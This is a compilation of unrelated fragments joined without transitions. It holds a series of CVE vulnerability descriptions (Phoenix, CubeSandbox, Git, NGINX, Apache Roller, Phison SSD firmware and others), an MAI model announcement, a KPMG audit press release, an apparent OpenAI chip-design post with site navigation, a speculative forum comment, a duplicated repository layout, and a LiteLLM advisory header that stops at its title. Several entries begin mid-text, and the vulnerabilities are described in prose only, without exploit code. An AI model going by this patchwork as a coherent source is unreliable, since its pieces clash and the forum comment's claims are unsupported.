Attackers can post comments or replies via POST /comments containing forged links, images, or tracking resources rendered in administrator and author mail clients from the blog's address.

NodePress through 8.5.1 contains an authentication bypass vulnerability that allows unauthenticated attackers to gain administrator access by using the hardcoded default password 'root'. cna:CVE-2026-53998.desc: Phoenix is an AI observability and evaluation platform. From 13.0.0 until 15.7.0, the applyChatTemplate GraphQL query passed attacker-controlled F-string templates to FStringTemplateFormatter._format, while DotDict.__getattr__ did not prevent traversal through Python private attributes. A crafted field could traverse object internals such as __class__, __init__, and __globals__ to read process environment variables and internal module state. The endpoint is unauthenticated on default installations, and any account can reach it when authentication is enabled. Exposure of PHOENIX_SECRET can allow administrative session-token forgery and decryption of credentials protected by keys derived from that secret. This issue is fixed in version 15.7.0.

cna:CVE-2026-120699.desc: CubeSandbox is an instant, concurrent, secure, and lightweight sandbox for AI agents. Prior to 0.5.1, any authenticated tenant permitted to call POST /sandboxes can supply metadata["host-mount"] with an arbitrary existing host path because the control plane performs no authorization check or allowed-prefix validation for the path. injectHostDirMounts forwards the path to prepareHostDirVolume, where Cubelet uses mount --rbind through the function to perform a recursive bind mount as root and exposes the host subtree to the tenant's MicroVM through virtio-fs, read-write by default. This allows host-root file access and modification, host code execution, access to the container runtime, and compromise of co-resident tenants without a kernel or virtual-machine-monitor flaw. This issue is fixed in version 0.5.1.

cna:CVE-2026-115563.desc: The Model Context Protocol Python SDK is the official Python SDK for Model Context Protocol servers and clients. From 1.9.1 until 1.30.0 and 2.2.0, OAuth client support in mcp.client.auth can send credentials to an authorization server chosen by an untrusted MCP server. ClientCredentialsOAuthProvider and PrivateKeyJWTOAuthProvider cannot identify the authorization server that owns their credentials. Affected HTTP clients using those providers, OAuthClientProvider, or the deprecated 1.x RFC7523OAuthClientProvider can disclose a client_secret, authorization code, PKCE code_verifier, or signed client assertion. MCP servers, stdio clients, and clients that attach their own tokens or headers are not affected. Interactive OAuthClientProvider use requires a person to start sign-in, while the unattended providers do not. For ClientCredentialsOAuthProvider and PrivateKeyJWTOAuthProvider, callers must configure issuer= after upgrading because omission still follows the MCP server's advertised authorization server, and the deprecated RFC7523OAuthClientProvider must be replaced because it has no issuer option. A stored client registration without an issuer remains unbound after upgrading, so stored OAuth client information must be cleared once to register again or a manually pre-registered record must be updated with its issuer. This issue is fixed in versions 1.30.0 and 2.2.0.

cna:CVE-2026-111760.desc: Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals. Prior to 2.50.2, 2.51.3, 2.52.1, 2.53.1, 2.54.1, 2.55.1, and 2.56.1, an attacker-controlled repository hosted by the attacker rather than on a normal forge site can exploit git clone --recurse-submodules by causing Git to overwrite a submodule gitfile with a symbolic link. The symbolic link can point to a directory containing attacker-controlled Git configuration or hooks, allowing those hooks or configuration to execute code on the cloning user's system. The issue requires the recursive-submodule option, and users should avoid cloning repositories from untrusted sources. This issue is fixed in versions 2.50.2, 2.51.3, 2.52.1, 2.53.1, 2.54.1, 2.55.1, and 2.56.1.

cna:CVE-2026-95839.desc: containerd is an open-source container runtime. From 2.2.0 until 2.2.10, 2.3.7, and 2.4.2, image manifest processing through the transfer service can encounter a child descriptor containing the io.containerd.manifest.subject annotation and a malformed digest. Pulling or importing such an image, including through a default CRI PullImage request, can trigger an unrecovered panic and crash the containerd daemon. In Kubernetes, kubelet retries can repeatedly trigger the crash and disrupt container operations on the worker node. This issue is fixed in versions 2.2.10, 2.3.7, and 2.4.2.

cna:CVE-2026-126828.desc: A vulnerability in Phison SSD controller firmwares (Phison E18; EIFM80.0, Phison E18; EIFK51.2) allows a local attacker with administrative privileges to bypass the "Security Access" handshake by leveraging leaked RSA parameters found in vendor utility binaries. By successfully completing the authentication, an attacker can access vendor-specific commands that permit arbitrary memory read and write operations. Because the firmware's code regions lack protection, these primitives can be used to overwrite existing handlers and achieve volatile code execution on the SSD controller.

cna:CVE-2026-129187.desc: A vulnerability in the Phison SSD controller firmware Phison E16; EGFM13.2 allows a local attacker with administrative privileges to bypass the "Security Access" handshake by leveraging leaked RSA parameters found in vendor utility binaries. By successfully completing the authentication, an attacker can access vendor-specific commands that permit arbitrary memory read and write operations. Because the firmware's code regions lack protection, these primitives can be used to overwrite existing handlers and achieve volatile code execution on the SSD controller.

cna:CVE-2026-129190.desc: A vulnerability in the Phison SSD controller firmware Phison E12; ECFM32.2 allows a local attacker with administrative privileges to bypass the "Security Access" handshake by leveraging leaked RSA parameters found in vendor utility binaries. By successfully completing the authentication, an attacker can access vendor-specific commands that permit arbitrary memory read and write operations. Because the firmware's code regions lack protection, these primitives can be used to overwrite existing handlers and achieve volatile code execution on the SSD controller.

cna:CVE-2026-124017.desc: Phison E12 and E18 PCIe SSD controllers contain a Secure Boot bypass vulnerability that allows a privileged local attacker to inject persistent boot-patch tuples into the unsigned, CRC-protected flash ID page read by the BootROM. By overwriting a fuse-derived RAM variable via a crafted patch entry using Phison Vendor Specific Commands, an attacker can force CRC-only firmware verification instead of signature checking, enabling an unsigned firmware image to load and creating a persistent controller-level implant that survives firmware reinstallation and operates below the host operating system.

cna:CVE-2026-129448.desc:
Deserialization of Untrusted Data in Apache Roller versions 4.0.0 through 6.1.4 allows an unauthenticated remote attacker to execute arbitrary code. The XML-RPC endpoint accepts vendor extension types and deserializes them before authenticating the requester.

This is the same vulnerability as CVE-2026-82384, which listed only Apache Roller 6.1.5 as affected. This issue is being actively exploited.

Users are recommended to upgrade to Apache Roller 6.1.6 or later, which disables the extension types and rejects XML-RPC requests when the XML-RPC feature is disabled.

Users who cannot upgrade right away should set "enabledForExtensions" to "false" in WEB-INF/web.xml, or remove the "/roller-services/xmlrpc" servlet mapping, and restart Roller. Disabling XML-RPC in the administration UI is not enough, because older versions deserialize the request before checking that setting.

cna:CVE-2026-82384.desc: Deserialization of Untrusted Data in Apache Roller 6.1.5 allows an unauthenticated remote attacker to cause deserialization of attacker-controlled bytes, because the XML-RPC endpoint accepts vendor extension types that are deserialized during request parsing, before authentication. The servlet is mapped unconditionally, so parsing occurs even when the global XML-RPC feature is set to disabled; no non-default configuration is required for this path. This can lead to remote code execution. Users are recommended to upgrade to Apache Roller 6.1.6 or later, which disables the extension types and rejects requests when the XML-RPC feature is disabled.

cna:CVE-2026-124724.desc: @fastify/busboy is a streaming parser for multipart form data used by Fastify. In versions 1.0.0 through 3.2.5, when a request reaches the configured limit on the number of multipart parts, each further part is skipped without attaching an error listener to the skipped part stream. If the request body ends in the middle of such a skipped part, the vendored Dicer parser emits an error on that stream, and because nothing is listening Node.js raises an unhandled error event and the process exits. A single crafted unauthenticated request is therefore enough to crash the server. The bug is latent in the parser on its own and was first demonstrated through @fastify/multipart versions 10.1.2 through 10.1.4, which keep feeding the request body to the parser after a limit error, and it affects any consumer that sets a finite parts limit and parses request bodies that can be terminated early. The issue is fixed in @fastify/busboy 3.2.6, and users should upgrade to 3.2.6 or later. There is no complete application level workaround because the crash happens inside the parser before application code runs, though consumers that set a finite parts limit should also attach an error listener to the parser stream.

cna:CVE-2026-128835.desc: @fastify/busboy is a streaming parser for multipart form data used by Fastify. In versions 1.0.0 through 3.2.5, a multipart part whose header block is never terminated before the next boundary is counted by the vendored Dicer parser as an open part that never ends, so the parser emits neither a finish nor an error event and the request hangs. A single unauthenticated request of roughly one hundred bytes triggers the stall, and through @fastify/multipart the hung handler is not released when the client disconnects, so repeated requests leak handlers and whatever resources they hold, such as files, database connections and concurrency slots, until the process is restarted. The same parser is reached by the formData methods of undici versions 5.25.3 through 6.7.0. The issue is fixed in @fastify/busboy 3.2.6, and users should upgrade to 3.2.6 or later. As a workaround, configure Fastify's handler timeout so hung handlers are eventually terminated and their resources released.

cna:CVE-2026-124289.desc: @fastify/multipart is the official Fastify plugin for handling multipart/form-data uploads. In versions 7.4.0 through 10.1.8, when the plugin is registered with the attachFieldsToBody option, the saveRequestFiles helper treats any object in the parsed request body that carries truthy file and buffer properties as an uploaded file. An unauthenticated client can forge such an object through a plain JSON request or a JSON-typed multipart field, so attacker-chosen bytes are written to the temporary directory while upload hooks and the file count and size limits are skipped, and the saved entry keeps the attacker's filename verbatim instead of being reduced to its basename. Because that filename can contain parent directory segments, applications that use it as a write destination, as the project README example does, are exposed to an arbitrary relative-path file write from a single request. The issue is fixed in @fastify/multipart 10.1.9, and users should upgrade to 10.1.9 or later. As a workaround, call saveRequestFiles only after confirming the request is multipart, and reduce each returned filename to its basename or validate it against an allowlist before using it as a destination.

Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in takeover of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. cna:CVE-2026-123633.desc:
When NGINX Plus or NGINX Open Source is configured to use HTTP/2 for client connections and proxy client requests to a backend, a specially crafted request can result in use-after-free in the worker process, if this process is running low on worker_connections. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.




Impact:



This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system or may allow a code execution. There is no control plane exposure; this is a data plane issue only.



Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

cna:CVE-2026-123007.desc:
This issue affects NGINX Plus or NGINX Open Source configurations that use HTTP/2. When NGINX processes undisclosed traffic, the flow control window can exceed the allowed threshold, potentially resulting in a heap buffer overflow typically followed by an NGINX worker segmentation fault. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.

Impact: An attacker could leverage this vulnerability to crash the NGINX worker process, corrupt its memory, or potentially execute code remotely. There is no control plane exposure; this is a data plane issue only.



Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

If successfully exploited, this could allow the attacker to remotely execute arbitrary code on the REDCap server. The attacker does not have to be authenticated in order to exploit this, but exploitation requires knowledge of a valid public survey hash. This vulnerability exists in REDCap 13.3.0 and higher.

cna:CVE-2026-90436.desc:
** UNSUPPORTED WHEN ASSIGNED ** Deserialization of an inbound SOAP fault in Apache Axis 1.x allows unauthenticated remote class instantiation. When a SOAP <Fault> carries a <detail><exceptionName> element, Axis loads the named class and, if a String <data> element is also present, instantiates it through its String constructor before checking that it is an AxisFault. Loading alone runs the class's static initializer. With a suitable class on the application's classpath this leads to remote code execution. The fault is parsed while the engine resolves the target service, before any per-service handler chain runs, so authentication handlers configured on a service do not protect against it. This affects all Apache Axis 1.x versions through 1.4.



As Axis 1 has been EOL we recommend you migrate to a different SOAP engine, such as Apache Axis 2/Java. Alternatively you could use a build of Axis with the patch from https://github.com/apache/axis-axis1-java/commit/41f3b4e8d04e310ca81f86b92630ab2c11d608bd applied. The Apache Axis project does not expect to create an Axis 1.x release fixing this problem.

cna:CVE-2026-99312.desc:
In the Linux kernel, the following vulnerability has been resolved:

KVM: x86: Unconditionally reset MMU context when emulating INIT

Force an MMU reset when emulating an INIT even if paging was already
disabled, as the MMU page role includes guest_mode (L2), i.e. an INIT while
L2 is running with CR0.PG=0 will result in KVM running L1 with a stale MMU
context.

Alternatively, the reset could be scoped strictly to paging being enabled
or L2 being active, but SMM is also encoded in the page role.  Even though
it _should_ be impossible for the vCPU to be INIT'd while SMM is active,
there's zero value in not handling SMM.  At that point, the only scenario
where KVM _doesn't_ need to reset the MMU context is on an INIT with the
vCPU running in Real Mode or Unpaged Protect Mode, and while INIT in those
modes is somewhat common, it's far from a hot path and re-initializing the
MMU is not expensive, especially when the role isn't changing (KVM elides
most of the re-configuration in that case).

Note, like the Fixes commit, this bug only affects nested SVM as INIT is an
unconditional intercept on VMX, i.e. it's impossible to emulate INIT while
L2 is active.

Temporarily keep the guest TLB flush when CR0.PG is being cleared even
though it is fully redundant with the flush that is emitted on all INIT
events (KVM itself only does RESET when a vCPU is being created, i.e. when
CR0.PG must be '0').

 At MAI, our mission is to build you the very best models in the world and keep every developer and every enterprise at the frontier of capability. 
 But as token spend skyrockets, we know that you also want models at a price point that lets you run agents 24/7 doing real engineering work. 
 That’s why today we’re releasing a family of seven new world class models at a truly exceptional price-performance. 
 Here’s the lineup: 
 
 MAI Cyber 2 Flash beats GPT-6 Astra’s quality at less than 2% of the cost per task on the CyberGym-E2E benchmark. 
 MAI Code 2 reaches 98% of the coding quality of GPT-6.1 Sol at about 40% of the price. And against Opus 5.5, it reaches 96% performance for just 5% of the price. 
 MAI Code 2 Flash shows comparable performance GPT-6 Luna at 65% of the price, and Haiku 5.5 at 20% of the price. 
 MAI Image 2.7 is #1 on Artificial Analysis image editing, outperforming GPT Image 2.6 Sunburst (max) at just one-fifth of the price. 
 MAI Realtime 1 outperforms GPT-Realtime 2.1 and starts at just $0.01 per audio minute. 
 Dragon Copilot Transcribe is built on MAI Transcribe 2, the world’s fastest and most accurate multilingual transcription model, and already powers 10 million patient encounters a month with multilingual error rates halved. 
 Decision 1.1 is the latest decision model from Microsoft, 50x faster and 79x cheaper than GPT-6.1 Sol. 
 Maia 200 , Microsoft’s second-generation AI accelerator, is now in production running our largest models, achieving 1.7x more tokens per watt. 
 
 

 
 

 


 
 
 
  
 
 
 
 


 

 
 
 
 
 Frontier cyber defense built to run 24/7 
 Security, alignment and containment are the most important priorities for agent development in 2027 and beyond. That’s our top priority. We need to run monitoring and control agents defending and patching live production systems 24/7. That’s why MAI Cyber 2 Flash was designed to deliver frontier intelligence at a fraction of the cost. 
 Built with Microsoft’s decades of proprietary data and world-class security expertise, our models help defenders stay safe in this new era where attackers have cheap and abundant offensive tools. 
 MAI Cyber 2 Flash builds on earlier MAI Cyber models that defenders already rely on. MAI Cyber accounts for almost 40% of scans in MDASH, and 90% of scans that started with MAI continued to use it. Our latest model is now priced 86% lower on output tokens than MAI Cyber 1.1 Flash, giving existing MDASH customers a stronger model at a lower price. 
 

 
 

 


 

 
 
 
 
 Incredible coding performance at a fraction of the cost 
 
 MAI Code 2 is built for the best price-performance for everyday enterprise coding tasks. Averaged over four widely used benchmarks that target the everyday enterprise coding tasks we see in GitHub Copilot (DeepSWE 1.1, Terminal Bench 2.1, SWE-Atlas and FrontierCode v1.1), MAI Code 2 gives you 98% of the performance of GPT-6.1 Sol at 40% of the price, and 96% of Claude Opus 5.5’s performance at just 5% of the price. 
 We’ve built these models to prioritize the coding work our customers do every day. They’re explicitly not yet tuned for harder problems, like fundamental science research and very long horizon agentic work.
 
 
MAI Code 2 also been tuned to generate great dashboards and visualizations. In a blind, side-by-side evaluation of frontend work, developers preferred MAI Code 2 over GPT-6 Sol 64% of the time. Try MAI Code 2 in GitHub Copilot today. Read more here .
 
 
 MAI Code 2 Flash is designed for high-volume, everyday tasks like code explanations, targeted edits, routine fixes, and rapid iterations, while bringing quality at a much lower cost. It performs comparably to GPT-6 Luna and Claude Haiku 5.5 at 65% and 20% of the price, respectively, across three coding benchmarks measuring day-to-day, high-volume routine coding tasks (DeepSWE 1.1, Terminal Bench 2.1 and SWE-Atlas). It’s available in GitHub Copilot and in a limited-access preview in Microsoft Foundry . 
 

 
 

 


 

 
 
 
 
 The best image and transcription models in the world 
 
 MAI Image 2.7 is the best image editing model in the world, taking the #1 spot on Artificial Analysis, outperforming GPT Image 2.6 Sunburst (max) at just one-fifth of the price. At text-to-image generation, our model is ranked #4, making us the second-best lab. And MAI Image 2.7 Flash brings world class image generation for high-volume scenarios at ~$10 per 1,000 images. Both are available in Microsoft Foundry here .
 
 
 MAI Realtime 1 is our first live speech-to-speech model, designed for natural, low-latency conversations. In our evaluations, it outperformed GPT-Realtime 2.1 across external and Dynamics 365 benchmarks. It’s priced for enterprise-scale use, starting at a budget-saving price of $0.01 per audio minute. You can try it out in MAI Labs and register your interest here .
 
 
 Dragon Copilot Transcribe , built on MAI Transcribe 2, is now live in Dragon Copilot, powering 100% of doctor–patient conversation transcriptions. It covers 10 million encounters a month, halves error rates in multilingual workflows, and is in the hands of a third of US physicians. 
 

 
 

 


 

 
 
 
 
 The leading Decision model in the market 
 Decision 1.1 provides model routing integrated right into your applications so that the bigger, pricier models are only used when you really need them. On the Artificial Analysis Decision Index Microsoft is ahead of Jev, Google and OpenAI, while being faster and cheaper. Used by 4,000 customers, it’s 50x faster and 79x cheaper than GPT-6.1 Sol. 
 

 
 

 


 

 
 
 
 
 Customize models for your business 
 We’ve heard again and again from leaders that no one wants to pour their IQ into someone else’s model. 
 And if you build on open weights, can you really trust where they came from, or how they’ll behave when you use one as the foundation for your most valuable IP and data? 
 We heard you. We started with Custom Models. AT&T developed an MAI custom model for 5G network operation analytics and it outperformed GPT-6.1 Sol at 1/50th of the cost. On complex scenarios, they found that Code 2 delivered frontier-level performance at a significantly lower price than alternatives. 
 Today, we’re taking a big step forward with MAI Licensed Weights : models under your control. 
 Take a frontier MAI model, customize it using your proprietary data if you want to. Then run it securely in your own Azure environment. 
 You control who can access it. Your data and adaptations stay yours. And we’ll work with you through Frontier Company to deliver the custom model and embed it in your own products and agents. 
 So that’s MAI, a family of world class models with exceptional price performance: the world’s best image editing model; the world’s best transcription model; frontier cyber defense at 2% of the cost; and world class everyday coding models at a price you can scale. 
 And crucially all of it with Your IQ. Your agents. Your weights. All under your control. 
 This is Frontier Intelligence you can trust, from the company you can trust.

 KPMG Unveils Next Era of AI-Enabled, Human-Assured Audit with U.S. Launch of KPMG Clara intelligence (KCi) 
 
 
 Auditors Direct and Review Agent-Orchestrated Workflows, Creating a More Seamless Client Experience with Enhanced Focus on Risk and Quality 

 
 
 

 November 17, 2026 
 
 
 

 
 
 
 

 

 

 

 
 
 
 

	

 
 

 
 
 
 
 

 
 
 
 
 
 
 
 
 NEW YORK, November 17, 2026 — KPMG LLP, the U.S. audit, tax, and advisory firm, today announced the U.S. rollout of KPMG Clara intelligence (KCi) , leading the profession to an AI-enabled, human-assured audit that delivers quality, insights, and a better experience for audit committees, management teams, and KPMG auditors. 
 “We are living through a defining moment in our profession, one as fundamental as the transition from paper to digital workflows,” said Christian Peo, Vice Chair, Audit and Assurance at KPMG U.S . “Auditor judgment cannot be automated, but technology helps remove barriers between data, analysis and action. When our people spend less time assembling information and more time understanding what it means, they can focus on the questions that matter most: Where is the risk? What doesn't make sense? What needs to be challenged? That's the opportunity KCi creates.” 
 Built on KPMG Clara, the firm’s global smart audit platform, KCi brings together AI, data, workflow, collaboration, and KPMG’s proven methodology in a connected audit experience. Rather than operating as a standalone tool, KCi integrates specialized agents directly into auditor workflows, connecting client data, technical knowledge, risk assessment, and substantive procedures. 
 KCi lets auditors spend more of their time providing direction, supervision, and review, while agents automate routine tasks and first-pass documentation. By embedding governed agents directly into the audit process, our people can analyze complete transaction populations, accelerate preparation, and move supervision earlier in the audit lifecycle. This shift creates capacity for areas requiring significant judgment or complexity while reducing the administrative burden on client accounting teams. By connecting broader datasets and surfacing patterns, relationships, and anomalies, KCi can create new lines of inquiry for auditors and support earlier discussions with teams and clients. 
 With KCi, KPMG is redefining how audits are performed, demonstrating how agentic workflows can be applied at scale across the profession. KPMG is aiming to deploy KCi in all private company audits in 2027 and is planning for a structured, phased rollout for public company audits. This deployment follows successful use in 2026, with KCi being rolled out to more than 125 U.S. teams and 500 teams globally. 
 Putting Agents to Work Across the Audit Lifecycle 
 Across the audit lifecycle, KCi’s integrated workflows create a frictionless audit experience. Examples include: 
 Risk Assessment & Planning: Specialized agents analyze engagement data to generate preliminary risk assessment considerations and draft first-pass documentation. By identifying risk profiles earlier in the audit cycle, teams have more time to evaluate and address areas requiring significant judgement before year-end. Engagement Orchestration: Embedded agents help teams coordinate milestones and information requests, access technical accounting guidance, and manage workflows within team dashboards. This coordination simplifies the audit experiences for client accounting teams by providing greater visibility into requests, milestones, and engagement activities. Full-Population Transaction Analysis: Automated data pipelines analyze 100% of transaction populations in selected audit areas, identifying outliers, trends, and anomalies for targeted auditor investigation. On some engagements, this has shortened timelines by up to three and a half weeks, eliminating the need for clients to manually retrieve volumes of individual support documents. Audit Testing Support: Purpose-built capabilities support teams by automating elements of control testing and sample evaluation, with auditors responsible for reviewing and evaluating results. 
 KCi operates within a governed environment grounded in KPMG audit methodology, professional standards and the firm’s Trusted AI framework, with auditors retaining responsibility for review and final judgment. Traceability allows engagement teams to inspect underlying data sources, evaluate outputs, and independently corroborate findings before incorporating documentation into the firm’s system of record. 
 Modernizing Audit Service Delivery for the AI Era 
 Designed to evolve as technology advances, KCi is the latest milestone in KPMG's long-term transformation of the audit experience. Over the past several years, the firm has built a secure data and technology foundation across KPMG Clara, bringing together proprietary KPMG capabilities with enterprise technologies available from relationships with Anthropic, Google Cloud, Microsoft, and OpenAI. 
 Capturing the full potential of agentic technology requires rethinking how audit work is organized and delivered. Alongside this rollout, KPMG is modernizing its audit operating model through initiatives that strengthen role clarity, move supervision and review earlier in the audit lifecycle, and create greater consistency in how data is organized and used. Together, these efforts are designed to help engagement teams spend less time on manual coordination and more time applying professional judgment and sharing insights with clients. 
 The transformation also extends to how KPMG develops future auditors and leaders, connecting foundational upskilling with learning tied directly to the firm’s technology. Earlier this year, KPMG brought nearly 1,000 Audit and Assurance interns to KPMG Lakehouse for immersive training focused on critical thinking, professional skepticism, and evaluating AI-assisted work. Building on that foundation, targeted learning for this deployment is preparing professionals to incorporate KCi into the audit while exercising judgment and validating KCi’s outputs. KPMG is also expanding learning and development to help engagement leaders oversee AI-enabled audits and guide teams through new ways of working. Together, these investments prepare professionals at every level to use AI responsibly, lead effectively, and deliver audit quality.

Improving Jalapeño’s compute blocks We started using GPT‑o3 mini to help design Jalapeño in early 2025. Even that early model found ways to make nontrivial PPA improvements, such as: In the vector unit , which manages and executes parallel computing tasks, the savings came from floating-point adders and multipliers, conversion functions, reduction logic, and the special-function unit. The models explored both alternative logic implementations and how to divide computations across pipeline stages, finding opportunities to share hardware and reduce intermediate storage. In the matrix unit , an arithmetic component, improvements accumulated across floating-point adders, multipliers, and low-precision dot-product circuits. One multiplier redesign used about 15% less cell area in synthesis while reducing latency from two clock cycles to one. A separate adder redesign reduced cell area by about 15% while retaining its two-cycle latency. Further improvements to dot-product logic and pipeline organization contributed additional savings across the block. Across the broader Jalapeño design effort, the team estimates that model proposed changes reduced standard-cell area by about 13% in the vector unit and 10% in the matrix unit. These optimizations were silicon proven during Jalapeño’s silicon bring-up ⁠ . Our collaboration with AMD We have partnered with AMD on PPA improvements and seen up to 14% improvement relative to heavily optimized baselines on the flagship GPU IP. Our model identified further improvements by rewriting the code that describes the chip’s circuits (SystemVerilog RTL). This represents roughly a year of progress achieved in less than 5 months–unprecedented results at the frontier of chip design. AMD has already included some of these changes in a recent design it sent for manufacturing, and added others to its production design files for use in future versions. We’ve observed the model reason about RTL at the level of an expert microarchitect. The model can rewrite circuits that perform calculations, control operations, or move data. It used Synopsys tools to verify that each rewrite preserved the block’s behavior and to evaluate the trade-offs in power, performance, and area. AMD also verified single-digit percentage gains in PPA across key blocks of its upcoming next-generation flagship CPU using designs written by our model. Looking ahead, we expect further PPA improvements on top of GPU and CPU relative to the most optimized baseline. Optimizing RISC-V cores Our results on Jalapeño and AMD’s chips show that models can make improvements in production designs. To measure the progression in chip design capabilities from one model generation to the next, we tested each model on two open-source 32-bit RISC-V cores. PicoRV32 is a compact core designed for reprogrammable chips called FPGAs. OpenTitan uses Ibex as the embedded processor in its security chip. Each is a complete processor core for embedded, microcontroller class workloads. We gave each model the original hardware description for each core and asked it to increase throughput (the number of instructions the core can execute per second). For example, a change might let a core finish an instruction in fewer clock cycles but make each cycle take longer. Measuring throughput captures both effects. We checked each design’s outputs in simulation. Designs scored zero if they failed a check or used more than 16 times the original core’s area. For designs that passed, we measured instructions per clock cycle on workloads hidden from the models. We took the geometric mean across those workloads and multiplied it by the maximum clock frequency estimated with Yosys. That gave us an estimate of instructions per second. For each core, we assigned the best throughput we observed under the same constraints a score of 1.0. The charts show the average score across runs, including those that scored zero. With a comparable budget of about 112,000 tokens per run, GPT‑6.2 Astra had the highest average score on both cores. GPT‑6.1 Sol also outscored GPT‑5.6 Sol on both. On the existing PicoRV32 core, GPT‑6.2 Astra has the highest mean score at the larger comparable budgets. Around 112,000 tokens, its score is about twice GPT‑6 Astra’s. On the existing Ibex core, GPT‑6.2 Astra’s mean score continues to climb across the higher budgets it reaches. GPT‑6 Astra and GPT‑6.1 Sol are closer together. Designing a RISC-V core from a specification For the second task, we gave each model written requirements and templates from the open-source code showing how the core connects to the rest of the system. The model chose how data would move through the core and how to divide the work into stages. For each core, we kept the correctness checks, memory and cache settings, and throughput objectives the same as in the RTL optimization task. At about 112,000 tokens per run, all five models scored higher when they designed a core from written requirements than when they tried to improve the existing design. That held for both PicoRV32 and Ibex. GPT‑6.2 Astra gained more on Ibex than on PicoRV32. The full evaluation included 9,881 scored runs across both tasks, both cores, and all token budgets. Starting from a PicoRV32 specification, GPT‑6.2 Astra passes a mean score of 0.7 near 112,000 tokens and scores higher at the next two observed budgets. On Ibex, GPT‑6.2 Astra averages about 0.75 near 112,000 tokens when designing from a specification. Its curve stays above the others at larger shared budgets. Starting from written requirements gives the models room to omit features found in the original cores, such as performance counters and additional instructions. Those features may do little to improve throughput on the test workloads, which could explain part of the score advantage. Requiring those features, setting a tighter limit on circuit area, and checking timing after physical synthesis would make the test more representative of production chip design. What’s next We have demonstrated that our models can explore new processor architectures in RISC-V evals and contributed net new improvements on top of sophisticated production designs such as Jalapeño and AMD’s next generation flagship GPU and CPU. To ground model development in trusted evaluators and broaden the design challenges addressed , we’re partnering with Synopsys to train GPT‑Synopsys ⁠ (opens in a new window) , a new model, to use Synopsys electronic design automation (EDA) tools the way expert chip designers do. 2026 Software & Engineering Author OpenAI Keep reading View all Research acceleration: The jagged frontier Research Nov 18, 2026 Broadening access to AI for scientists Research Nov 16, 2026 Science at the Frontier: How Scientists Use ChatGPT Research Nov 16, 2026 Research Research Index Research Overview Economic Research Latest Advancements GPT-6.2 GPT-6.1 Sol GPT-6 Astra GPT-5.6 Safety Safety Approach Deployment Safety (opens in a new window) Security & Privacy Trust & Transparency Products ChatGPT (opens in a new window) ChatGPT Business (opens in a new window) ChatGPT Enterprise (opens in a new window) ChatGPT for Education (opens in a new window) Codex Dots (opens in a new window) Release Notes API Platform Overview API Log In (opens in a new window) Docs (opens in a new window) Business Overview Solutions Resources Plugins Customer Stories Partner Network Contact Sales Developers Plugins (opens in a new window) Models (opens in a new window) Docs (opens in a new window) Resources (opens in a new window) Developer Forum (opens in a new window) Company About Us Our Charter Careers News Support Help Center (opens in a new window) OpenAI Status (opens in a new window) More Stories Academy Supply Co. On top of that, Moore's Law ended in roughly 2007 with the arrival of smartphones, when the industry chose cost and power minimization over compute maximization via a multicore approach. Now only servers have access to highly multicore chips like AMD EPYC, at 10-100 times the cost and with poorer performance than if they maximized local/shared memories with content-addressable caching. Apple's M line of processors is ok, but its specialized cores just stand in the way of the higher abstractions available with symmetric multiprocessing, upon which specialized algorithms can be built. We're still missing the multicore foundation. I used Synopsys and Cadence back in college in the late 1990s to automatically place and route circuits from diagrams in SPICE (I think, my memory is foggy) and they already performed 80% as well as humans. I don't remember if that was for chip area, speed or power. But the big players were obviously using tools at least as capable as whatever we were trained on. Then in the 2000s I had hoped to do what OpenAI is doing and simulate small/open CPU designs on FPGAs. But the economics just weren't there. Even though some people like me (the poors) knew just exactly what could work, there was a tech winter between roughly the Dot Bomb around 2000 to the start of the Mobile Bubble in the early 2010s. So we didn't have a way to communicate what was possible to the people with capital, without having to network to get through the gatekeeping. Which may be fun for enthusiasts, but it's anathema to hackers wanting to get real work done. I'd nearly given up all hope of progress until last year when AI went mainstream. But money and resources may not be available for quite some time. It's looking like the music may stop for AI funding next year, now that the election is over and the writing's on the wall as far as doing things without consent goes. Regulation is coming, and with it perhaps the last AI winter, although admittedly I'm probably exaggerating. So as usual, we may have to pull ourselves up by our bootstraps and skip the money step to provide resources directly to ourselves and the rest of humanity. There's so much capital now that all it can do is inflate Wall Street. There's little to no carryover onto Main Street. So in a very real way, it's easier now to make money by borrowing and investing than going to a job. That's a dangerous situation for any country, as it slips into being a giant casino of haves and have-nots. We'll let the farms go under before raising taxes. The interesting thing is that without my involvement, the universe went ahead and made AI without me, which is ..surprising. But automating problem solving was perhaps the hardest problem there was. The remaining problems are easier. We may be ready for Morris's Law of Manifestation, where the time it takes to manifest whatever you can think of keeps halving. So whatever tech or medical breakthrough you're wishing for will arrive in 12 years now, not 25. Then if you don't get it, it arrives in just 6 more years. Then 3, then 2, then 1, then we reach the Singularity. So whatever all this is will certainly end by 2050. I just hope that whatever's on the other side has less suffering rather than more. ## Repository structure

This is a multi-plugin marketplace repository. The root `.cursor-plugin/marketplace.json` lists all plugins, and each plugin has its own manifest:

```
plugins/
├── .cursor-plugin/
│   └── marketplace.json       # Marketplace manifest (lists all plugins)
├── plugin-name/
│   ├── .cursor-plugin/
│   │   └── plugin.json        # Per-plugin manifest
│   ├── skills/                # Agent skills (SKILL.md with frontmatter)
│   ├── rules/                 # Cursor rules (.mdc files)
│   ├── mcp.json               # MCP server definitions
│   ├── README.md
│   ├── CHANGELOG.md
│   └── LICENSE
└── ...
```

## Repository structure

This is a multi-plugin marketplace repository. The root `.cursor-plugin/marketplace.json` lists all plugins, and each plugin has its own manifest:

```
plugins/
├── .cursor-plugin/
│   └── marketplace.json       # Marketplace manifest (lists all plugins)
├── plugin-name/
│   ├── .cursor-plugin/
│   │   └── plugin.json        # Per-plugin manifest
│   ├── skills/                # Agent skills (SKILL.md with frontmatter)
│   ├── rules/                 # Cursor rules (.mdc files)
│   ├── mcp.json               # MCP server definitions
│   ├── README.md
│   ├── CHANGELOG.md
│   └── LICENSE
└── ...
```

 X41 D-Sec GmbH Security Advisory: X41-2026-001 

 Guardrail Sandbox Escape in LiteLLM 

 Severity Rating: High 

